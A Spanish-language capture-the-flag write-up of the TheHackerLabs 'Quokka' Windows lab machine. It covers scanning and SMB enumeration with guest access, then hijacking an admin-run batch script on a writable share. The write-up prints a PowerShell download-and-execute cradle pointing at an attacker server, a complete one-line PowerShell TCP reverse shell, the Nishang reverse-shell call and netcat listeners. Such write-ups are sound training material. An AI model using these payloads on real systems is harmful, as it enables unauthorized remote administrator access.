---
title: "Quokka - TheHackerLabs"
date: 2025-03-28
draft: false
slug: "THL-writeup-quokka"
excerpt: "Esta fue una máquina sencilla. Analizando el escaneo de servicios, nos damos cuenta de que podemos utilizar el usuario guest para entrar en el servicio SMB y que podemos visitar una página web activa en el puerto 80. Al visitar la página y no encontrar nada, pasamos a enumerar el servicio SMB, encontrando un script bat que se ejecuta con privilegios de administrador cada minuto. Descargamos y modificamos este script para que ejecute una Reverse Shell, con tal de poder conectarnos a la máquina víctima, siendo que nos conecta como el Administrador."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Windows", "SMB", "SMB Enumeration", "SMB Guest Account Exploitation", "Information Leakage", "Exploiting SMB Share", "Privesc - Exploiting SMB Share", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "arp-scan"
  - "wappalizer"
  - "crackmapexec"
  - "smbclient"
  - "smbmap"
  - "Nishang: Invoke-PowerShellTcp.ps1"
  - "wget"
  - "Python3"
  - "rlwrap"
  - "nc"
links:
  - "https://github.com/samratashok/nishang"
  - "https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-quokka/Quokka.png"
---

## Recopilación de Información {#Recopilacion}

### Descubrimiento de Hosts {#Hosts}

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.1.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-28 12:51 CST
...
Nmap scan report for 192.168.1.210
Host is up (0.00059s latency).
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
Nmap done: 256 IP addresses (18 hosts up) scanned in 2.58 seconds
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.1.0/24
Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.1.210	XX	PCS Systemtechnik GmbH
...
16 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.138 seconds (119.74 hosts/sec). 16 responded
```
Encontramos nuestro objetivo y es: `192.168.1.210`.

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.210
PING 192.168.1.210 (192.168.1.210) 56(84) bytes of data.
64 bytes from 192.168.1.210: icmp_seq=1 ttl=128 time=1.46 ms
64 bytes from 192.168.1.210: icmp_seq=2 ttl=128 time=0.558 ms
64 bytes from 192.168.1.210: icmp_seq=3 ttl=128 time=0.689 ms
64 bytes from 192.168.1.210: icmp_seq=4 ttl=128 time=0.663 ms

--- 192.168.1.210 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3021ms
rtt min/avg/max/mdev = 0.558/0.842/1.461/0.360 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.210 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-28 12:52 CST
Initiating ARP Ping Scan at 12:52
Scanning 192.168.1.210 [1 port]
Completed ARP Ping Scan at 12:52, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:52
Scanning 192.168.1.210 [65535 ports]
Discovered open port 80/tcp on 192.168.1.210
Discovered open port 135/tcp on 192.168.1.210
Discovered open port 445/tcp on 192.168.1.210
Discovered open port 139/tcp on 192.168.1.210
Discovered open port 49666/tcp on 192.168.1.210
Discovered open port 49668/tcp on 192.168.1.210
Discovered open port 49683/tcp on 192.168.1.210
Discovered open port 49665/tcp on 192.168.1.210
Discovered open port 47001/tcp on 192.168.1.210
Discovered open port 49664/tcp on 192.168.1.210
Discovered open port 49667/tcp on 192.168.1.210
Discovered open port 49669/tcp on 192.168.1.210
Discovered open port 5985/tcp on 192.168.1.210
Completed SYN Stealth Scan at 12:52, 10.31s elapsed (65535 total ports)
Nmap scan report for 192.168.1.210
Host is up, received arp-response (0.0010s latency).
Scanned at 2025-03-28 12:52:18 CST for 10s
Not shown: 65519 closed tcp ports (reset), 3 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 128
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
5985/tcp  open  wsman        syn-ack ttl 128
47001/tcp open  winrm        syn-ack ttl 128
49664/tcp open  unknown      syn-ack ttl 128
49665/tcp open  unknown      syn-ack ttl 128
49666/tcp open  unknown      syn-ack ttl 128
49667/tcp open  unknown      syn-ack ttl 128
49668/tcp open  unknown      syn-ack ttl 128
49669/tcp open  unknown      syn-ack ttl 128
49683/tcp open  unknown      syn-ack ttl 128
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.51 seconds
           Raw packets sent: 66498 (2.926MB) | Rcvd: 65533 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Como siempre en **Windows** hay varios puertos abiertos y me da curiosidad el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49683 192.168.1.210 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-28 12:52 CST
Nmap scan report for 192.168.1.210
Host is up (0.00079s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0

| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Portfolio y Noticias Tech de Quokka 
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Datacenter 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49683/tcp open  msrpc        Microsoft Windows RPC
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2025-03-28T18:53:55
|_  start_date: 2025-03-28T18:46:50
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: WIN-VRU3GG3DPLJ
|   NetBIOS computer name: WIN-VRU3GG3DPLJ\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-28T19:53:55+01:00
|_clock-skew: mean: -19m58s, deviation: 34m37s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.44 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

El escaneo nos está diciendo que podemos utilizar el **usuario guest** para ver el **servicio SMB**. Pero, primero vamos a ver la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-quokka/Captura1.png">
</p>

Parece una página web sobre Hacking.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-quokka/Captura2.png">
</p>

No mucho.

Si aplicamos **Fuzzing**, lo único que encontraremos será un directorio llamado `/avatar`:

<p align="center">
<img src="/assets/images/THL-writeup-quokka/Captura3.png">
</p>

De ahí en fuera no hay nada más, por lo que vamos a analizar el **servicio SMB**.

### Análisis y Enumeración de Servicio SMB {#SMB}

Veamos qué nos dice **crackmapexec**:
```bash
crackmapexec smb 192.168.1.210
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:WIN-VRU3GG3DPLJ) (signing:False) (SMBv1:True)
```
Parece que no es necesario loguearnos para ver los recursos compartidos.

Vamos a listarlos con **smbclient**:
```bash
smbclient -L //192.168.1.210// -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Admin remota
	C$              Disk      Recurso predeterminado
	Compartido      Disk      
	IPC$            IPC       IPC remota
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.1.210 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Funciona y podemos ver el **directorio Compartido**.

Veamos qué nos dice **smbmap**:
```bash
smbmap -H 192.168.1.210 -u 'guest' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.1.210:445	Name: 192.168.1.210      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	Compartido                                        	READ, WRITE	
	IPC$                                              	READ ONLY	IPC remota
[*] Closed 1 connections
```
Excelente, tenemos permisos de escritura y lectura en este recurso.

Vamos a enumerar este recurso.

#### Enumeración de Servicio SMB con smbclient {#enumSMB1}

Vamos a loguearnos utilizando **smbclient**:
```batch
smbclient -U 'guest' //192.168.1.210/Compartido -N
Try "help" to get a list of possible commands.
smb: \>
```
Estamos dentro.

Veamos qué hay dentro:
```batch
smb: \> ls
  .                                   D        0  Fri Mar 28 13:43:35 2025
  ..                                  D        0  Fri Mar 28 13:43:35 2025
  Documentación                      D        0  Sun Oct 27 08:33:53 2024
  Logs                                D        0  Sun Oct 27 08:33:54 2024
  Proyectos                           D        0  Sun Oct 27 08:33:54 2024
```
Son algunos directorios y dentro hay varios archivos.

El directorio que nos interesa es **Proyectos**, pues aquí encontraremos un directorio que contiene unos scripts que podemos analizar.

La ruta es `Proyectos/Quokka/Código`:
```batch
smb: \Proyectos\Quokka\Código\> ls
  .                                   D        0  Fri Mar 28 14:02:53 2025
  ..                                  D        0  Fri Mar 28 14:02:53 2025
  index.html                          A       52  Sun Oct 27 08:33:54 2024
  mantenimiento - copia.bat           A     1252  Sun Oct 27 08:41:43 2024
  mantenimiento.bat                   A      359  Sun Oct 28 19:49:04 2024
  README.md                           A       56  Sun Oct 27 08:33:54 2024

		7735807 blocks of size 4096. 4814841 blocks available
```

Vamos a descargar esos dos **scripts bat**:
```batch
smb: \Proyectos\Quokka\Código\> get mantenimiento.bat
getting file \Proyectos\Quokka\Código\mantenimiento.bat of size 359 as mantenimiento.bat (50.1 KiloBytes/sec) (average 35.1 KiloBytes/sec)
.
smb: \Proyectos\Quokka\Código\> get "mantenimiento - copia.bat"
getting file \Proyectos\Quokka\Código\mantenimiento - copia.bat of size 1252 as mantenimiento - copia.bat (174.7 KiloBytes/sec) (average 174.7 KiloBytes/sec)
```
Ya los tenemos, ahora podemos analizarlos.

#### Enumeración de Servicio SMB con smbmap {#enumSMB2}

Ya vimos que funciona **smbmap** si le damos el **usuario guest**:
```bash
smbmap -H 192.168.1.210 -u 'guest' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.1.210:445	Name: 192.168.1.210      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	Compartido                                        	READ, WRITE	
	IPC$                                              	READ ONLY	IPC remota
[*] Closed 1 connections
```

Recordemos que la ruta que nos interesa es `Proyectos/Quokka/Código`:
```bash
smbmap -H 192.168.1.210 -u 'guest' -r Compartido/Proyectos/Quokka/Código --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.1.210:445	Name: 192.168.1.210      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	Compartido                                        	READ, WRITE	
	./CompartidoProyectos/Quokka/Código
	dr--r--r--                0 Fri Mar 28 14:02:53 2025	.
	dr--r--r--                0 Fri Mar 28 14:02:53 2025	..
	fr--r--r--               52 Sun Oct 27 08:51:14 2024	index.html
	fr--r--r--             1252 Sun Oct 27 08:51:14 2024	mantenimiento - copia.bat
	fr--r--r--              359 Sun Oct 28 19:49:04 2024	mantenimiento.bat
	fr--r--r--               56 Sun Oct 27 08:51:14 2024	README.md
	IPC$                                              	READ ONLY	IPC remota
[*] Closed 1 connections
```

Y podemos descargar los **scripts bat**:
```bash
smbmap -H 192.168.1.210 -u 'guest' --download Compartido/Proyectos/Quokka/Código/mantenimiento.bat --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[+] Starting download: Compartido\Proyectos\Quokka\Código\mantenimiento.bat (359 bytes)
[+] File output to: /../TheHackersLabs/Quokka/content/192.168.1.210-Compartido_Proyectos_Quokka_Código_mantenimiento.bat
[*] Closed 1 connections
.
smbmap -H 192.168.1.210 -u 'guest' --download Compartido/Proyectos/Quokka/Código/mantenimiento\ -\ copia.bat --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[+] Starting download: Compartido\Proyectos\Quokka\Código\mantenimiento - copia.bat (1252 bytes)
[+] File output to: /../TheHackersLabs/Quokka/content/192.168.1.210-Compartido_Proyectos_Quokka_Código_mantenimiento - copia.bat
[*] Closed 1 connections
```
Listo, ahora podemos analizarlos.

#### Enumeración de Servicio SMB con crackmapexec {#enumSMB3}

Veamos qué nos dice **crackmapexec** sobre el **usuario guest**:
```bash
crackmapexec smb 192.168.1.210 -u 'guest' -p ''
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:WIN-VRU3GG3DPLJ) (signing:False) (SMBv1:True)
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  [+] WIN-VRU3GG3DPLJ\guest:
```

Bien, podemos usarlo para ver los recursos compartidos:
```bash
crackmapexec smb 192.168.1.210 -u 'guest' -p '' --shares
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:WIN-VRU3GG3DPLJ) (signing:False) (SMBv1:True)
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  [+] WIN-VRU3GG3DPLJ\guest: 
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  [+] Enumerated shares
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  Share           Permissions     Remark
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  -----           -----------     ------
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  ADMIN$                          Admin remota
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  C$                              Recurso predeterminado
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  Compartido      READ,WRITE      
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  IPC$                            IPC remota
```
Y como ya conocemos la ruta y los archivos que queremos analizar, podemos descargarlos, pero no podremos, ya que parece que el **usuario guest** no tiene permisos suficientes.

Lo que sí podemos hacer, es enumerar los usuarios existentes en la máquina víctima:
```bash
crackmapexec smb 192.168.1.210 -u 'guest' -p '' --rid-brute
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:WIN-VRU3GG3DPLJ) (signing:False) (SMBv1:True)
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  [+] WIN-VRU3GG3DPLJ\guest: 
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  [+] Brute forcing RIDs
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  500: WIN-VRU3GG3DPLJ\Administrador (SidTypeUser)
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  501: WIN-VRU3GG3DPLJ\Invitado (SidTypeUser)
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  503: WIN-VRU3GG3DPLJ\DefaultAccount (SidTypeUser)
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  513: WIN-VRU3GG3DPLJ\Ninguno (SidTypeGroup)
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  1000: WIN-VRU3GG3DPLJ\Omar (SidTypeUser)
SMB         192.168.1.210  445    WIN-VRU3GG3DPLJ  1001: WIN-VRU3GG3DPLJ\0mar (SidTypeUser)
```
Tenemos al **usuario 0mar**, pero no tenemos su contraseña.

Ya no podremos hacer más, por lo que mejor analizamos los archivos que descargamos.

### Analizando Scripts bat {#batFiles}

Veamos qué contiene el script **mantenimiento.bat**:
```bash
cat mantenimiento.bat
@echo off
:: Mantenimiento del sistema de copias de seguridad
:: Este script es ejecutado cada minuto

REM Pista: Tal vez haya algo m�s aqu�...

:: Reverse shell a Kali
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString('http://192.168.1.36:8000/shell.ps1')"

:: Fin del script
exit
```
Parece que este script que se ejecuta cada minuto y ejecuta un **archivo ps1** de un servidor remoto, y por lo que entiendo, está ejecutando una **Reverse Shell**.

Seamos más específicos:

| Opción                          | Descripción |
|---------------------------------|-------------|
| `powershell`                    | Ejecuta PowerShell. |
| `-NoP` (`-NoProfile`)           | No carga el perfil del usuario de PowerShell. |
| `-NonI` (`-NonInteractive`)     | Ejecuta PowerShell en modo no interactivo. |
| `-W Hidden`                     | Oculta la ventana de PowerShell. |
| `-Exec Bypass`                  | Omite la política de ejecución de scripts de PowerShell. |
| `-Command`                      | Ejecuta el siguiente comando de PowerShell. |
| `iex(...)` (`Invoke-Expression`) | Ejecuta el código descargado como si fuera parte del script. |
| `(New-Object Net.WebClient)`     | Crea un objeto `Net.WebClient` para descargar datos por HTTP. |
| `.DownloadString('http://192.168.1.36:8000/shell.ps1')` | Descarga y ejecuta `shell.ps1` desde el servidor remoto. |

Con esto ya queda claro lo que hace este script, pasemos al siguiente.

Veamos qué nos dice el script **mantenimiento - copia.bat**:
```bash
cat mantenimiento\ -\ copia.bat
@echo off
:: ------------------------------------------------------------------
:: Mantenimiento del sistema de copias de seguridad
:: Este script es ejecutado cada minuto para mover los archivos de logs
:: Nota: Asegúrate de no modificar este script sin permisos de administrador
:: ------------------------------------------------------------------

:: Pista: Este script se ejecuta con permisos elevados. Seguro que no hay nada más?

REM Mover los archivos de logs a la carpeta de respaldo
echo Moviendo archivos de logs...
move "C:\Logs\*.log" "C:\Backup\OldLogs\"

:: Pista oculta: Si tienes acceso a este script, podrás manipular su comportamiento.
:: Asegúrate de revisar las líneas de comando en detalle. Tal vez haya una forma de aprovechar esta ejecución

REM Verificar el estado del sistema
echo Verificando el estado del sistema...
systeminfo > nul

REM Comprobando si los archivos temporales necesitan limpieza
echo Limpiando archivos temporales...
del /q "C:\Temp\*.*"

REM Pista: Todo parece estar bajo control, pero realmente lo estÃ¡?
REM Este script se ejecuta con permisos de administrador cada minuto. Tal vez haya algo Ãºtil aquÃ­.

:: Fin del script
echo OperaciÃ³n completada.
exit
```
Según las notas que tiene este script, se ejecuta con privilegios de administrador (lo cual es peligroso que dicho archivo esté en un recurso expuesto), mueve todos los **archivos log** del directorio `C:/Logs/` al directorio `C:/Backup/OldLogs`, verifica si el sistema es accesible con `systeminfo > nul`, y por último, borra todos los archivos que estén dentro de `C:/Temp/`.

Por lo que entiendo, el script que se está ejecutando con privilegios de admin, es el script **mantenimiento.bat**. Entonces, es posible modificarlo para que pueda realizar acciones no deseadas y parece que alguien ya lo hizo.

## Explotación de Vulnerabilidades {#Explotacion}

### Aprovechandonos de Script mantenimiento.bat para Ganar Acceso a la Máquina Víctima {#Exploit}

Vamos a jugar un poco con este script **mantenimiento.bat**, para poder ganar acceso a la máquina víctima.

#### Utilizando Invoke-PowerShellTcp.ps1 de Nishang y Modificando Script mantenimiento.bat para que lo Ejecute {#revShell}

Como ya vimos que este script ejecuta una **Reverse Shell** de un servidor remoto, solamente tenemos que crear nuestra **Reverse Shell**, levantar un servidor y modificar el script **mantenimiento.bat** para que apunte a nuestro servidor.

Primero, vamos a descargar el **script Invoke-PowerShellTcp.ps1 de Nishang** que nos servirá como una **Reverse Shell**.

Aquí lo puedes encontrar:
* <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">Repositorio de samratashok - Invoke-PowerShellTcp.ps1</a>

La podemos descargar con **wget**:
```bash
wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1
...
```

Modificamos este script, agregándole al final la instrucción que indica que será utilizado como una **Reverse Shell**:
```powershell
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress Tu_IP -Port 443
```

Levanta un servidor con **Python3**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Utiliza **rlwrap** para abrir una **netcat** que capturará la **Reverse Shell**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Modificamos el script **mantenimiento.bat** para agregar nuestra IP y el nombre del script de **Nishang**:
```powershell
:: Reverse shell a Kali
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString('http://Tu_IP/Invoke-PowerShellTcp.ps1')"
```

Por último, subimos el script **mantenimiento.bat** modificado al **SMB** y esperamos la respuesta:
```bash
smbmap -H 192.168.1.210 -u guest --upload mantenimiento.bat Compartido/Proyectos/Quokka/Código/mantenimiento.bat --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[+] Starting upload: mantenimiento.bat (356 bytes)                                                                       
[+] Upload complete
[*] Closed 1 connections
```
Recuerda que tienes que esperar 1 minuto.

Observa la **netcat**:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.210] 50790
Windows PowerShell running as user Administrador on WIN-VRU3GG3DPLJ
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
.
PS C:\Windows\system32>whoami
win-vru3gg3dplj\administrador
```
Estamos dentro.

#### Creando Reverse Shell de PowerShell y Ejecutandola con Script mantenimiento.bat {#revShell2}

Podemos utilizar la segunda opción de **Reverse Shell de PowerShell** de `revshells.com` para crear un script que se llame **revShell.ps1** y se ejecute de la misma manera que el método anterior.

Quedaría así el script, solamente con los **script-blocks**:

<p align="center">
<img src="/assets/images/THL-writeup-quokka/Captura4.png">
</p>

```powershell
$client = New-Object System.Net.Sockets.TCPClient('Tu_IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Ahora, seguimos el mismo proceso de modificar y subir el script **mantenimiento.bat**.

Levanta un servidor con **Python3**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Utiliza **rlwrap** para abrir una **netcat** que capturará la **Reverse Shell**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Modificamos el script **mantenimiento.bat** para agregar nuestra IP y el nombre del script de **Nishang**:
```bash
:: Reverse shell a Kali
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString('http://Tu_IP/revShell.ps1')"
```

Subimos el script **mantenimiento.bat** modificado al **SMB**:
```bash
smbmap -H 192.168.1.210 -u guest --upload mantenimiento.bat Compartido/Proyectos/Quokka/Código/mantenimiento.bat --no-banner
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)
[+] Starting upload: mantenimiento.bat (356 bytes)
[+] Upload complete
[*] Closed 1 connections
```

Y espera un minuto, luego, revisa la **netcat**:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.210] 51014
.
PS C:\Windows\system32> whoami
win-vru3gg3dplj\administrador
```
Excelente, volvimos a ganar acceso.

Ya solo buscamos las flags:
```batch
PS C:\Windows\system32> cd C:\Users\0mar\Desktop
PS C:\Users\0mar\Desktop> dir

    Directorio: C:\Users\0mar\Desktop

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       27/10/2024     16:16             25 user.txt                                                              

PS C:\Users\0mar\Desktop> type user.txt
...
PS C:\Users\0mar\Desktop> cd C:\Users\Administrador\Desktop
PS C:\Users\Administrador\Desktop> dir

    Directorio: C:\Users\Administrador\Desktop

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       27/10/2024     16:16             30 admin.txt                                                             

PS C:\Users\Administrador\Desktop> type admin.txt
...
```
Con esto terminamos la máquina.
